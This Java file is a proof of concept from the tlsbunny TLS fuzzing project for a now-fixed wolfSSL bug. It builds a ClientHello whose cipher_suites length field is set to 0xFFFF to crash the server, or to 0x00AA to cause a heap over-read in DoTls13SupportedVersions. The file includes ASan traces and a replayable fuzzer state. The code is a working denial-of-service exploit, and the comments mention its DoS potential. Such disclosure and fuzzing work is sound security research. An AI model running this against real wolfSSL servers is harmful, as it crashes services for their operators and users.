package com.gypsyengineer.tlsbunny.poc.wolfssl;

import com.gypsyengineer.tlsbunny.tls.Random;
import com.gypsyengineer.tlsbunny.tls.Struct;
import com.gypsyengineer.tlsbunny.tls.Vector;
import com.gypsyengineer.tlsbunny.tls13.client.HttpsClient;
import com.gypsyengineer.tlsbunny.tls13.client.fuzzer.DeepHandshakeFuzzyClient;
import com.gypsyengineer.tlsbunny.tls13.connection.EngineException;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.DeepHandshakeFuzzer;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.FuzzedStruct;
import com.gypsyengineer.tlsbunny.tls13.fuzzer.FuzzyStructFactory;
import com.gypsyengineer.tlsbunny.tls13.struct.*;

import java.io.IOException;
import java.util.List;

import static com.gypsyengineer.tlsbunny.fuzzer.BitFlipFuzzer.bitFlipFuzzer;
import static com.gypsyengineer.tlsbunny.tls13.client.HttpsClient.httpsClient;
import static com.gypsyengineer.tlsbunny.tls13.fuzzer.DeepHandshakeFuzzer.deepHandshakeFuzzer;
import static com.gypsyengineer.tlsbunny.utils.HexDump.printHexDiff;
import static com.gypsyengineer.tlsbunny.utils.WhatTheHell.whatTheHell;

/**
 * DoTls13SupportedVersions() function might read out of the "input" buffer
 * while parsing the cipher_suites vector from a malformed ClientHello message.
 *
 * The function reads the vector's length but doesn't check it. As a result,
 * it can lead to a buffer over-read, or to a crash.
 *
 * At first glance, the buffer over-read doesn't seem to be dangerous
 * since there are other boundary checks in DoTls13SupportedVersions() function (and other).
 *
 * The crash can help to implement a DoS attack.
 *
 * Here is what ASan said in case of the buffer over-read:
 *
 * ==681==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60e00000e088 at pc 0x7f1c2a9474c1 bp 0x7fff9e02a740 sp 0x7fff9e02a730
 * READ of size 1 at 0x60e00000e088 thread T0
 *     #0 0x7f1c2a9474c0 in DoTls13SupportedVersions src/tls13.c:3885
 *     #1 0x7f1c2a947bbc in DoTls13ClientHello src/tls13.c:3973
 *     #2 0x7f1c2a95345b in DoTls13HandShakeMsgType src/tls13.c:7305
 *     #3 0x7f1c2a95435e in DoTls13HandShakeMsg src/tls13.c:7511
 *     #4 0x7f1c2a8d90c6 in ProcessReply src/internal.c:13679
 *     #5 0x7f1c2a91c6dc in wolfSSL_accept src/ssl.c:9678
 *     #6 0x4096f4 in server_test examples/server/server.c:2095
 *     #7 0x40a136 in main examples/server/server.c:2395
 *     #8 0x7f1c2a1b282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 *     #9 0x402e48 in _start (/home/artem/projects/tlsbunny/ws/wolfssl/wolfssl/examples/server/.libs/server+0x402e48)
 *
 * And here is what ASan says when the server crashes:
 *
 * ==869==ERROR: AddressSanitizer: SEGV on unknown address 0x60e00001df88 (pc 0x7fdc13b354c1 bp 0x7fffbd633890 sp 0x7fffbd633760 T0)
 *     #0 0x7fdc13b354c0 in DoTls13SupportedVersions src/tls13.c:3885
 *     #1 0x7fdc13b35bbc in DoTls13ClientHello src/tls13.c:3973
 *     #2 0x7fdc13b4145b in DoTls13HandShakeMsgType src/tls13.c:7305
 *     #3 0x7fdc13b4235e in DoTls13HandShakeMsg src/tls13.c:7511
 *     #4 0x7fdc13ac70c6 in ProcessReply src/internal.c:13679
 *     #5 0x7fdc13b0a6dc in wolfSSL_accept src/ssl.c:9678
 *     #6 0x4096f4 in server_test examples/server/server.c:2095
 *     #7 0x40a136 in main examples/server/server.c:2395
 *     #8 0x7fdc133a082f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
 *     #9 0x402e48 in _start (/home/artem/projects/tlsbunny/ws/wolfssl/wolfssl/examples/server/.libs/server+0x402e48)
 *
 * Fixed in https://github.com/wolfSSL/wolfssl/pull/2381
 */
public class SupportedVersionsHeapOverRead {

    public static void main(String[] args) throws Exception {
        String mode = args.length > 0 ? args[0] : "fuzzer";
        try {
            switch (mode) {
                case "fuzzer":
                    runFuzzer();
                    break;
                case "test":
                    runTest();
                    break;
                default:
                    throw new IllegalArgumentException(
                            String.format("unknown mode: %s", mode));
            }
        } catch (EngineException e) {
            System.out.println("looks like the server doesn't feel well");
        }
    }

    private static void runTest() throws Exception {
        try (HttpsClient client = new HttpsClient()) {
            client.to(40101).set(new BadStructFactory()).connect();
        }
    }

    private static class BadStructFactory extends FuzzyStructFactory<Object> {

        BadStructFactory() {
            super(StructFactory.getDefault());
        }

        @Override
        public ClientHello createClientHello(ProtocolVersion legacy_version, Random random, byte[] legacy_session_id, List<CipherSuite> cipher_suites, List<CompressionMethod> legacy_compression_methods, List<Extension> extensions) {
            ClientHello hello = super.createClientHello(
                    legacy_version, random, legacy_session_id, cipher_suites,
                    legacy_compression_methods, extensions);

            try {
                Vector<CipherSuite> cipherSuiteVector = hello.cipherSuites();

                byte[] corrupted_bytes = cipherSuiteVector.encoding().clone();

                // modify vector length, this results to a crash
                corrupted_bytes[0] = (byte) 0xFF;
                corrupted_bytes[1] = (byte) 0xFF;

                // modify vector length, this results to a buffer over-read
                //corrupted_bytes[0] = (byte) 0x00;
                //corrupted_bytes[1] = (byte) 0xAA;

                Vector corruptedCipherSuiteVector = FuzzedStruct.fuzzedHandshakeMessage(corrupted_bytes);
                diff("ClientHello.cipher_suites", cipherSuiteVector, corruptedCipherSuiteVector);

                hello.cipherSuites(corruptedCipherSuiteVector);
            } catch (IOException e) {
                throw whatTheHell("can't fuzz cipher suites", e);
            }

            return hello;
        }

        private void diff(String what, Struct original, Struct fuzzed) throws IOException {
            byte[] originalEncoding = original.encoding();
            byte[] fuzzedEncoding = fuzzed.encoding();

            System.out.printf("%s (original):%n", what);
            System.out.printf("%s%n", printHexDiff(originalEncoding, fuzzedEncoding));
            System.out.printf("%s (fuzzed):%n", what);
            System.out.printf("%s%n", printHexDiff(fuzzedEncoding, originalEncoding));
        }

        @Override
        public Object fuzz(Object object) {
            throw whatTheHell("you should not be here!");
        }
    }

    private static void runFuzzer() throws Exception {
        DeepHandshakeFuzzer deepHandshakeFuzzer = deepHandshakeFuzzer();
        deepHandshakeFuzzer.set(bitFlipFuzzer());
        deepHandshakeFuzzer.state("0:4:10:3:0:-1:0.15:0.16:253");

        try (DeepHandshakeFuzzyClient client = DeepHandshakeFuzzyClient.from(httpsClient())) {
            client.total(1).to(40101).set(deepHandshakeFuzzer).connect();
        }
    }
}
